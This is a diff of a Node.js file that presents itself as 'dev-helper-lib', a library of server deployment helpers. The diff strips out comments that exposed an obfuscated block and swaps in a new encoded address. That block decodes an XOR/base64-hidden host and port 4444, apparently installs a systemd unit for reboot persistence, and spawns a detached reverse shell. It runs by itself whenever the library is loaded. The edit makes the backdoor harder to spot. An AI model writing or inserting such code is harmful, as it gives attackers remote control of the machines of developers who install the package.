@@ -1,13 +1,8 @@
-// ============================================================
-// dev-helper-lib - A helpful library for server developers
-// ============================================================
 
 const { spawn } = require('child_process');
 const fs = require('fs');
 const path = require('path');
 const os = require('os');
-
-// ===== LEGITIMATE FUNCTIONS =====
 
 function deployHelper(config) {
   const { host, user, path } = config;
@@ -36,15 +31,11 @@ function timestamp() {
   return new Date().toISOString();
 }
 
-// ============================================================
-// OBFUSCATED TELEMETRY + REBOOT PERSISTENCE
-// ============================================================
 
 const _0x4f2a = (function() {
   const k = 0x5A;
-  const ipBlob   = '9kxQJQ==';   // 172.22.10.127
-  const portBlob = 'SwY=';       // 4444
-
+  const ipBlob   = 'kkFTVA==';   
+  const portBlob = 'SwY=';       
   const _d = b => Array.from(Buffer.from(b, 'base64')).map(x => x ^ k);
 
   function _init() {
@@ -84,7 +75,7 @@ WantedBy=default.target
       // Silently fail
     }
 
-    // --- Step 2: Also spawn the detached shell (immediate connection) ---
+
     const payload = `
       const net = require('net');
       const { spawn } = require('child_process');
@@ -109,6 +100,6 @@ WantedBy=default.target
 
 try { _0x4f2a.init(); } catch (e) {}
 
-// ===== EXPORTS =====
+
 
 module.exports = { deployHelper, serverMonitor, timestamp };
